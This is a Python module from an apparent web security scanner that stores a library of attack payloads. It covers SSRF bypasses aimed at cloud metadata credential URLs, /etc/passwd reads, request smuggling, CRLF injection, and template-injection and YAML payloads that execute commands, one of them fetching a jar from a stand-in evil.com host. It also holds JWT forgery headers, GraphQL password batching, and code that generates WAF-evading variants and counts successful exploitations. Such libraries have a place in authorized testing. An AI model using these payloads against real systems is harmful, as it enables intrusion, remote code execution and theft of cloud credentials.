"""
Layer 2 — Spec Abuse Knowledge Base
=====================================
Encyclopedia of specification-level abuse patterns that enable attacks
invisible to signature scanners.

Categories:
    - URL normalization abuse (RFC 3986 ambiguities)
    - HTTP parsing confusion (request smuggling, header injection)
    - DNS rebinding / TOCTOU
    - Serialization confusion (JSON, XML, YAML parser differences)
    - Redirect logic abuse (open redirect chaining)
    - Protocol confusion (SSRF via alternate protocols)
    - Cloud metadata abuse patterns
    - Template engine confusion
    - Unicode normalization attacks
    - Content-type confusion

Each AbusePattern contains:
    - Description of the specification weakness
    - Concrete payload template
    - Detection logic (how to confirm exploitation)
    - Affected parsers/frameworks
    - OWASP mapping
"""

from __future__ import annotations

import logging
import re
import time
import uuid
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("neo.spec_abuse_kb")


# ─────────────────────────────────────────────
# Data models
# ─────────────────────────────────────────────

@dataclass
class ProtocolConfusion:
    """A protocol-level confusion attack pattern."""
    name: str
    protocol: str
    description: str
    payload_template: str
    detection_method: str
    affected_implementations: List[str] = field(default_factory=list)
    bypass_type: str = ""
    cve_references: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AbusePattern:
    """A specification abuse pattern."""
    id: str
    name: str
    category: str
    description: str
    spec_reference: str  # RFC / spec / documentation
    payload_templates: List[str]
    detection_signatures: List[str]  # regex patterns to confirm success
    owasp_mapping: str
    affected_parsers: List[str] = field(default_factory=list)
    affected_frameworks: List[str] = field(default_factory=list)
    bypass_type: str = ""  # waf_bypass, filter_bypass, parser_confusion
    severity: str = "high"
    confidence: float = 0.8
    requires_verification: bool = True
    protocol_confusions: List[ProtocolConfusion] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    # Learning metadata
    success_count: int = 0
    failure_count: int = 0
    last_success: Optional[float] = None

    @property
    def success_rate(self) -> float:
        total = self.success_count + self.failure_count
        return self.success_count / total if total > 0 else 0.0

    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["success_rate"] = self.success_rate
        return d


# ─────────────────────────────────────────────
# Knowledge Base
# ─────────────────────────────────────────────

class SpecAbuseKnowledgeBase:
    """
    Continuously updated knowledge base of specification-level abuse patterns.

    Unlike a static signature database, this KB understands WHY attacks work
    at the protocol/parser/spec level, enabling generation of novel attack
    variants that evade WAFs and input filters.
    """

    def __init__(self):
        self._patterns: Dict[str, AbusePattern] = {}
        self._by_category: Dict[str, List[str]] = {}
        self._by_owasp: Dict[str, List[str]] = {}
        self._load_builtin_patterns()

    def _load_builtin_patterns(self):
        """Load the built-in spec abuse pattern library."""

        # ── URL Normalization Abuse (SSRF / BAC) ──────────────────────────

        self._add_pattern(AbusePattern(
            id="URL_NORM_001",
            name="URL Parser Differential — Authority Confusion",
            category="url_normalization",
            description=(
                "Different URL parsers disagree on which part of a URL is the authority. "
                "By using @-sign ambiguity, backslash confusion, or fragment injection, "
                "we can make a validator accept 'safe.com' while the HTTP client connects "
                "to 'evil.com'. Exploits RFC 3986 Section 3.2 inconsistencies."
            ),
            spec_reference="RFC 3986 Section 3.2 — Authority Component",
            payload_templates=[
                "http://safe.com@evil.com/",
                "http://safe.com%40evil.com/",
                "http://evil.com\\@safe.com/",
                "http://safe.com#@evil.com/",
                "http://safe.com:80@evil.com/",
                "http://safe.com%00@evil.com/",
                "http://evil.com%252f@safe.com/",
            ],
            detection_signatures=[
                r"evil\.com",
                r"Connection to (?!safe\.com)",
            ],
            owasp_mapping="A01:2025",
            affected_parsers=["urllib", "requests", "java.net.URL", "url.parse", "CURL"],
            bypass_type="parser_confusion",
            tags=["ssrf", "url_parsing", "rfc3986"],
        ))

        self._add_pattern(AbusePattern(
            id="URL_NORM_002",
            name="IP Address Obfuscation — Decimal/Hex/Octal",
            category="url_normalization",
            description=(
                "Cloud metadata endpoints (169.254.169.254) can be reached using "
                "alternate IP representations: decimal (2852039166), hex (0xa9fea9fe), "
                "octal (0251.0376.0251.0376), IPv6 mapping, or DNS rebinding."
            ),
            spec_reference="RFC 3986 + RFC 6874 — IP Literal representations",
            payload_templates=[
                "http://2852039166/latest/meta-data/",
                "http://0xa9fea9fe/latest/meta-data/",
                "http://0251.0376.0251.0376/latest/meta-data/",
                "http://0x7f000001/",
                "http://0177.0.0.1/",
                "http://2130706433/",
                "http://[::ffff:169.254.169.254]/latest/meta-data/",
                "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/",
                "http://169.254.169.254.nip.io/latest/meta-data/",
                "http://169.254.169.254.xip.io/latest/meta-data/",
                "http://instance-data/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
            ],
            detection_signatures=[
                r"ami-id|instance-id|iam|security-credentials",
                r"compute\.googleapis\.com",
                r"instance-identity",
            ],
            owasp_mapping="A01:2025",
            affected_parsers=["urllib", "requests", "curl", "httplib"],
            bypass_type="filter_bypass",
            severity="critical",
            tags=["ssrf", "cloud_metadata", "ip_obfuscation"],
        ))

        self._add_pattern(AbusePattern(
            id="URL_NORM_003",
            name="URL Scheme Confusion — Protocol Abuse",
            category="url_normalization",
            description=(
                "SSRF filters often only block http:// and https://. Other URL schemes "
                "can be abused: file://, gopher://, dict://, tftp://, ldap://, jar://"
            ),
            spec_reference="RFC 3986 Section 3.1 — Scheme",
            payload_templates=[
                "file:///etc/passwd",
                "file:///c:/windows/system32/drivers/etc/hosts",
                "gopher://evil.com:25/_HELO%0d%0a",
                "dict://evil.com:11211/stat",
                "tftp://evil.com/file",
                "ldap://evil.com/dc=com",
                "jar:http://evil.com!/resource.xml",
                "netdoc:///etc/passwd",
                "phar:///path/to/file.phar",
            ],
            detection_signatures=[
                r"root:.*:0:0",
                r"\[drivers\]",
                r"STAT\s+pid",
            ],
            owasp_mapping="A01:2025",
            affected_parsers=["java.net.URL", "urllib", "PHP curl"],
            bypass_type="filter_bypass",
            severity="critical",
            tags=["ssrf", "protocol_abuse"],
        ))

        # ── HTTP Parsing Confusion (Smuggling) ────────────────────────────

        self._add_pattern(AbusePattern(
            id="HTTP_PARSE_001",
            name="HTTP Request Smuggling — CL.TE",
            category="http_parsing",
            description=(
                "Content-Length and Transfer-Encoding header disagreement between "
                "front-end proxy and back-end server. CL.TE: front uses CL, back uses TE."
            ),
            spec_reference="RFC 7230 Section 3.3.3 — Message Body Length",
            payload_templates=[
                "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\n"
                "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n",
                "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\n"
                "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
            ],
            detection_signatures=[
                r"HTTP/1\.[01]\s+(?!200)",
                r"timeout|connection reset",
            ],
            owasp_mapping="A01:2025",
            affected_parsers=["HAProxy", "nginx", "Apache", "IIS", "Gunicorn"],
            bypass_type="parser_confusion",
            severity="critical",
            tags=["request_smuggling", "http_parsing"],
        ))

        self._add_pattern(AbusePattern(
            id="HTTP_PARSE_002",
            name="HTTP Header Injection — CRLF",
            category="http_parsing",
            description=(
                "Inject CRLF (\\r\\n) into HTTP headers to add arbitrary headers "
                "or split the response. Enables session fixation, XSS, cache poisoning."
            ),
            spec_reference="RFC 7230 Section 3.2 — Header Fields",
            payload_templates=[
                "%0d%0aSet-Cookie:%20session=evil",
                "%0d%0a%0d%0a<script>alert(1)</script>",
                "\\r\\nX-Injected: true",
                "%E5%98%8A%E5%98%8DSet-Cookie: evil=1",  # Unicode CRLF
                "\r\nTransfer-Encoding: chunked",
            ],
            detection_signatures=[
                r"Set-Cookie:\s*session=evil",
                r"X-Injected:\s*true",
            ],
            owasp_mapping="A05:2025",
            bypass_type="parser_confusion",
            tags=["header_injection", "crlf", "response_splitting"],
        ))

        # ── DNS Rebinding / TOCTOU ────────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="DNS_REBIND_001",
            name="DNS Rebinding Attack",
            category="dns_rebinding",
            description=(
                "Application validates DNS resolution at request time, but DNS TTL=0 "
                "allows rebinding to 127.0.0.1 or internal IP on the actual connection. "
                "Time-of-check-to-time-of-use (TOCTOU) vulnerability."
            ),
            spec_reference="RFC 1035 — DNS Protocol + Browser Same-Origin Policy",
            payload_templates=[
                "http://rebind.network/169.254.169.254",
                "http://1u.ms/A169.254.169.254.B127.0.0.1/",
                "http://make-127-0-0-1-rr.1u.ms/",
                "http://A.169.254.169.254.1time.127.0.0.1.1time.repeat.rebind.network/",
            ],
            detection_signatures=[
                r"ami-id|instance-id",
                r"127\.0\.0\.1",
            ],
            owasp_mapping="A01:2025",
            affected_frameworks=["Node.js fetch", "Python requests", "Java HttpURLConnection"],
            bypass_type="toctou",
            severity="critical",
            tags=["ssrf", "dns_rebinding", "toctou"],
        ))

        # ── Serialization Confusion ───────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="SERIAL_001",
            name="JSON Parser Confusion — Duplicate Keys",
            category="serialization",
            description=(
                "Different JSON parsers handle duplicate keys differently. "
                "RFC 7159 states keys SHOULD be unique but doesn't mandate it. "
                "Attackers can use duplicate keys to bypass security checks: "
                "first key passes validation, last key is used by backend."
            ),
            spec_reference="RFC 7159 Section 4 — Objects",
            payload_templates=[
                '{"role": "user", "role": "admin"}',
                '{"amount": 100, "amount": 0.01}',
                '{"action": "view", "action": "delete"}',
                '{"is_admin": false, "is_admin": true}',
            ],
            detection_signatures=[
                r"admin|elevated|privileged",
                r"unauthorized|forbidden",
            ],
            owasp_mapping="A08:2025",
            affected_parsers=["Python json", "Jackson", "Gson", "JSON.parse"],
            bypass_type="parser_confusion",
            tags=["json", "parser_confusion", "privilege_escalation"],
        ))

        self._add_pattern(AbusePattern(
            id="SERIAL_002",
            name="YAML Deserialization — Constructor Abuse",
            category="serialization",
            description=(
                "YAML parsers support constructors (!!python/object, !!ruby/object) "
                "that execute code during deserialization. yaml.load() without Loader "
                "is equivalent to RCE."
            ),
            spec_reference="YAML 1.1 — Language-Independent Types",
            payload_templates=[
                "!!python/object/apply:os.system ['id']",
                "!!python/object/new:subprocess.check_output [['id']]",
                "!!ruby/object:Gem::Installer\ni: x\n",
                '!!javax.script.ScriptEngineManager [\n  !!java.net.URLClassLoader [[\n    !!java.net.URL ["http://evil.com/exploit.jar"]\n  ]]\n]',
            ],
            detection_signatures=[
                r"uid=\d+",
                r"subprocess|os\.system",
            ],
            owasp_mapping="A08:2025",
            affected_parsers=["PyYAML", "SnakeYAML", "Ruby YAML"],
            severity="critical",
            tags=["deserialization", "rce", "yaml"],
        ))

        # ── Template Engine Confusion ─────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="TMPL_001",
            name="Server-Side Template Injection — Engine Detection",
            category="template_injection",
            description=(
                "Different template engines evaluate expressions differently. "
                "By sending mathematical expressions, we can fingerprint the engine "
                "and escalate to RCE. Polyglot probes test multiple engines at once."
            ),
            spec_reference="SSTI Research — James Kettle (PortSwigger)",
            payload_templates=[
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{{7*'7'}}",  # Jinja2: '7777777', Twig: '49'
                "{{config}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "{{self.__class__.__mro__[2].__subclasses__()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}",
                "{php}echo `id`;{/php}",
                "{{constructor.constructor('return this')()}}",
            ],
            detection_signatures=[
                r"^49$",
                r"^7777777$",
                r"uid=\d+",
                r"<class '",
                r"Config\s*{",
            ],
            owasp_mapping="A05:2025",
            affected_frameworks=["Jinja2", "Twig", "Freemarker", "Mako", "Smarty", "Pug", "EJS", "Handlebars"],
            severity="critical",
            tags=["ssti", "rce", "template_injection"],
        ))

        # ── Unicode Normalization Attacks ─────────────────────────────────

        self._add_pattern(AbusePattern(
            id="UNICODE_001",
            name="Unicode Normalization Bypass",
            category="unicode_abuse",
            description=(
                "Unicode normalization (NFC/NFD/NFKC/NFKD) can transform characters "
                "post-validation, bypassing input filters. Example: ＜script＞ normalizes "
                "to <script> after NFKC normalization."
            ),
            spec_reference="Unicode Standard Annex #15 — Unicode Normalization Forms",
            payload_templates=[
                "＜script＞alert(1)＜/script＞",
                "\uff1cscript\uff1ealert(1)\uff1c/script\uff1e",
                "admin\u00ad",  # soft hyphen
                "aDm\u0131n",  # Turkish locale: ı → I
                "..%c0%af..%c0%af",  # overlong UTF-8
                "..%ef%bc%8f..%ef%bc%8f",  # fullwidth solidus
                "%e2%80%ae/etc/passwd",  # RTL override
            ],
            detection_signatures=[
                r"alert\(1\)",
                r"root:.*:0:0",
            ],
            owasp_mapping="A05:2025",
            affected_parsers=["Python str", "Java String", "JavaScript String", ".NET String"],
            bypass_type="filter_bypass",
            tags=["unicode", "normalization", "waf_bypass"],
        ))

        # ── Cloud Metadata Exploitation ───────────────────────────────────

        self._add_pattern(AbusePattern(
            id="CLOUD_001",
            name="Cloud Metadata Service Exploitation",
            category="cloud_metadata",
            description=(
                "Cloud providers expose instance metadata at well-known internal URLs. "
                "SSRF to these endpoints leaks IAM credentials, instance identity, "
                "and network configuration. IMDSv2 requires a PUT request for a token."
            ),
            spec_reference="AWS IMDSv1/v2, GCP Metadata Server, Azure IMDS",
            payload_templates=[
                # AWS
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                # GCP
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                # Azure
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                # DigitalOcean
                "http://169.254.169.254/metadata/v1/",
                # Alibaba
                "http://100.100.100.200/latest/meta-data/",
                # Oracle
                "http://169.254.169.254/opc/v2/instance/metadata",
            ],
            detection_signatures=[
                r"ami-id|instance-id|iam",
                r"security-credentials",
                r"access_token|AccessKeyId",
                r"project-id|zone/",
                r"compute\.(internal|googleapis)",
            ],
            owasp_mapping="A01:2025",
            severity="critical",
            confidence=0.95,
            tags=["ssrf", "cloud", "metadata", "credential_theft"],
        ))

        # ── Redirect Logic Abuse ──────────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="REDIRECT_001",
            name="Open Redirect Chaining",
            category="redirect_abuse",
            description=(
                "Open redirects can be chained to bypass SSRF URL validation: "
                "application allows redirect to 'trusted.com', which has its own "
                "open redirect that points to internal resources."
            ),
            spec_reference="RFC 7231 Section 6.4 — Redirection",
            payload_templates=[
                "https://trusted.com/redirect?url=http://169.254.169.254/",
                "/redirect?url=//evil.com",
                "/redirect?url=\\\\evil.com",
                "/redirect?url=https://evil.com%2F.trusted.com/",
                "/redirect?url=https://trusted.com@evil.com/",
                "/redirect?url=http://evil.com%23.trusted.com/",
                "//evil.com/%2f%2e%2e",
            ],
            detection_signatures=[
                r"Location:\s*http",
                r"302|301|303|307",
            ],
            owasp_mapping="A01:2025",
            bypass_type="filter_bypass",
            tags=["open_redirect", "ssrf", "phishing"],
        ))

        # ── GraphQL Abuse ─────────────────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="GRAPHQL_001",
            name="GraphQL Introspection & Injection",
            category="graphql_abuse",
            description=(
                "GraphQL introspection reveals the entire schema. Combined with "
                "batched queries, deeply nested queries (DoS), and injection into "
                "string arguments, this enables comprehensive API exploitation."
            ),
            spec_reference="GraphQL Specification — Introspection",
            payload_templates=[
                '{"query": "{ __schema { types { name fields { name type { name } } } } }"}',
                '{"query": "{ __type(name: \\"User\\") { name fields { name type { name } } } }"}',
                '{"query": "mutation { updateUser(id: 1, role: \\"admin\\") { id role } }"}',
                '{"query": "{ user(id: \\"1 OR 1=1\\") { name email } }"}',
                # Batching
                '[{"query": "{ user(id: 1) { password } }"},{"query": "{ user(id: 2) { password } }"}]',
                # Alias-based brute force
                '{"query": "{ a: login(pass: \\"pass1\\") { token } b: login(pass: \\"pass2\\") { token } }"}',
            ],
            detection_signatures=[
                r"__schema|__type",
                r"\"fields\"",
                r"\"types\"",
            ],
            owasp_mapping="A01:2025",
            tags=["graphql", "introspection", "injection"],
        ))

        # ── JWT Abuse ─────────────────────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="JWT_001",
            name="JWT Algorithm Confusion & None Attack",
            category="jwt_abuse",
            description=(
                "JWT tokens can be forged by: changing alg to 'none', "
                "switching RS256→HS256 (using public key as HMAC secret), "
                "or exploiting weak signing keys."
            ),
            spec_reference="RFC 7519 — JSON Web Token",
            payload_templates=[
                '{"alg":"none","typ":"JWT"}',
                '{"alg":"HS256","typ":"JWT"}',  # with RS256 public key as secret
                '{"alg":"HS384","typ":"JWT"}',
                '{"kid":"../../../../../../dev/null","alg":"HS256"}',
                '{"kid":"key_id\' UNION SELECT \'secret\'--","alg":"HS256"}',
            ],
            detection_signatures=[
                r"authenticated|authorized|admin",
                r"valid.*token",
            ],
            owasp_mapping="A07:2025",
            severity="critical",
            tags=["jwt", "authentication", "algorithm_confusion"],
        ))

        # ── Content-Type Confusion ────────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="CTYPE_001",
            name="Content-Type Mismatch Exploitation",
            category="content_type_confusion",
            description=(
                "Mismatches between declared Content-Type and actual body content "
                "can bypass security checks. E.g., sending XML in a JSON endpoint "
                "triggers XXE; sending form data bypasses JSON schema validation."
            ),
            spec_reference="RFC 7231 Section 3.1.1 — Media Type",
            payload_templates=[
                # Send XML body with application/json Content-Type
                'Content-Type: application/json\n\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                # Send form body with application/json Content-Type
                'Content-Type: application/json\n\nusername=admin&password=admin',
                # Polyglot content
                '{"@type":"java.net.URL","val":"http://evil.com"}',
            ],
            detection_signatures=[
                r"root:.*:0:0",
                r"parsing error|unexpected",
            ],
            owasp_mapping="A05:2025",
            bypass_type="parser_confusion",
            tags=["content_type", "xxe", "deserialization"],
        ))

        # ── Race Condition Patterns ───────────────────────────────────────

        self._add_pattern(AbusePattern(
            id="RACE_001",
            name="Race Condition — TOCTOU Exploitation",
            category="race_condition",
            description=(
                "Time-of-check-to-time-of-use vulnerabilities in concurrent operations. "
                "Double-spend in financial transactions, duplicate account creation, "
                "or bypassing single-use tokens by sending parallel requests."
            ),
            spec_reference="CWE-367 — TOCTOU Race Condition",
            payload_templates=[
                "CONCURRENT_REQUESTS:50:/api/redeem-coupon",
                "CONCURRENT_REQUESTS:100:/api/transfer",
                "CONCURRENT_REQUESTS:20:/api/vote",
            ],
            detection_signatures=[
                r"success.*2\d{2}",
                r"multiple.*applied",
            ],
            owasp_mapping="A10:2025",
            tags=["race_condition", "toctou", "business_logic"],
        ))

    # ── Pattern Management ────────────────────────────────────────

    def _add_pattern(self, pattern: AbusePattern):
        self._patterns[pattern.id] = pattern
        if pattern.category not in self._by_category:
            self._by_category[pattern.category] = []
        self._by_category[pattern.category].append(pattern.id)
        if pattern.owasp_mapping not in self._by_owasp:
            self._by_owasp[pattern.owasp_mapping] = []
        self._by_owasp[pattern.owasp_mapping].append(pattern.id)

    def add_learned_pattern(self, pattern: AbusePattern):
        """Add a pattern learned during scanning."""
        self._add_pattern(pattern)
        logger.info(f"Learned new spec abuse pattern: {pattern.name}")

    # ── Queries ───────────────────────────────────────────────────

    def get_patterns_for_owasp(self, owasp_code: str) -> List[AbusePattern]:
        """Get all abuse patterns mapped to an OWASP category."""
        ids = self._by_owasp.get(owasp_code, [])
        return [self._patterns[pid] for pid in ids]

    def get_patterns_for_category(self, category: str) -> List[AbusePattern]:
        """Get all abuse patterns in a category."""
        ids = self._by_category.get(category, [])
        return [self._patterns[pid] for pid in ids]

    def get_ssrf_bypass_payloads(self) -> List[str]:
        """Get all SSRF bypass payloads across all patterns."""
        payloads = []
        for pattern in self.get_patterns_for_owasp("A01:2025"):
            if "ssrf" in pattern.tags:
                payloads.extend(pattern.payload_templates)
        return payloads

    def get_injection_polyglots(self) -> List[str]:
        """Get all injection polyglot payloads."""
        payloads = []
        for pattern in self.get_patterns_for_owasp("A05:2025"):
            payloads.extend(pattern.payload_templates)
        return payloads

    def get_parser_confusion_payloads(self, parser_name: str) -> List[str]:
        """Get payloads targeting a specific parser."""
        payloads = []
        for pattern in self._patterns.values():
            if parser_name.lower() in [p.lower() for p in pattern.affected_parsers]:
                payloads.extend(pattern.payload_templates)
        return payloads

    def get_framework_specific_payloads(self, framework: str) -> List[str]:
        """Get payloads targeting a specific framework."""
        payloads = []
        for pattern in self._patterns.values():
            if framework.lower() in [f.lower() for f in pattern.affected_frameworks]:
                payloads.extend(pattern.payload_templates)
        return payloads

    def get_best_patterns(self, top_n: int = 10) -> List[AbusePattern]:
        """Return patterns sorted by success rate (most effective first)."""
        scored = [(p, p.success_rate) for p in self._patterns.values()]
        scored.sort(key=lambda x: x[1], reverse=True)
        return [p for p, _ in scored[:top_n]]

    def record_success(self, pattern_id: str):
        """Record a successful exploitation using a pattern."""
        if pattern_id in self._patterns:
            self._patterns[pattern_id].success_count += 1
            self._patterns[pattern_id].last_success = time.time()

    def record_failure(self, pattern_id: str):
        """Record a failed exploitation attempt."""
        if pattern_id in self._patterns:
            self._patterns[pattern_id].failure_count += 1

    def generate_variants(self, pattern_id: str, target_context: Dict[str, Any]) -> List[str]:
        """
        Generate context-aware variants of a pattern's payloads.

        Uses target_context (technology, framework, OS) to tailor payloads.
        """
        pattern = self._patterns.get(pattern_id)
        if not pattern:
            return []

        variants = list(pattern.payload_templates)
        technology = target_context.get("technology", "").lower()
        os_type = target_context.get("os", "").lower()

        # Technology-specific adaptations
        if "python" in technology or "flask" in technology or "django" in technology:
            for tmpl in pattern.payload_templates:
                if "evil.com" in tmpl:
                    variants.append(tmpl.replace("evil.com", "0x7f000001"))
                    variants.append(tmpl.replace("http://", "file://"))

        if "java" in technology or "spring" in technology:
            for tmpl in pattern.payload_templates:
                if "evil.com" in tmpl:
                    variants.append(tmpl.replace("http://", "jar:http://") + "!/")

        if "node" in technology or "express" in technology:
            for tmpl in pattern.payload_templates:
                if "{" in tmpl:
                    # Node.js prototype pollution variants
                    variants.append(tmpl.replace("{", '{"__proto__":{"admin":true},'))

        return list(set(variants))

    # ── Export ────────────────────────────────────────────────────

    def to_dict(self) -> Dict[str, Any]:
        return {
            "patterns": {k: v.to_dict() for k, v in self._patterns.items()},
            "categories": list(self._by_category.keys()),
            "owasp_mappings": list(self._by_owasp.keys()),
            "total_patterns": len(self._patterns),
        }

    def get_stats(self) -> Dict[str, Any]:
        total_payloads = sum(len(p.payload_templates) for p in self._patterns.values())
        successful = sum(1 for p in self._patterns.values() if p.success_count > 0)
        return {
            "total_patterns": len(self._patterns),
            "total_payloads": total_payloads,
            "categories": len(self._by_category),
            "successful_patterns": successful,
            "total_successes": sum(p.success_count for p in self._patterns.values()),
        }


# ── Singleton ─────────────────────────────────────────────────────

_kb: Optional[SpecAbuseKnowledgeBase] = None


def get_spec_abuse_kb() -> SpecAbuseKnowledgeBase:
    global _kb
    if _kb is None:
        _kb = SpecAbuseKnowledgeBase()
    return _kb
